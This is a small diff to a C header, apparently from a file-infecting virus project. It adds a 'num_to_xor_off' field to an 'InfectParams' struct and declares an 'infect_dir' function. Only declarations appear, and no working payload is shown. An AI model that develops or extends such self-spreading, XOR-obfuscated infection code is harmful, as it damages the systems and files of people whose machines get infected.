@@ -44,6 +44,7 @@ typedef struct s_infect_params {
 	size_t gb_table_len_off;
 	size_t modif_table_off;
 	size_t modif_table_len_off;
+	size_t num_to_xor_off;
 } InfectParams;
 
 int			infect_dir(char *dirname, struct s_infect_params p, struct s_opt opt);
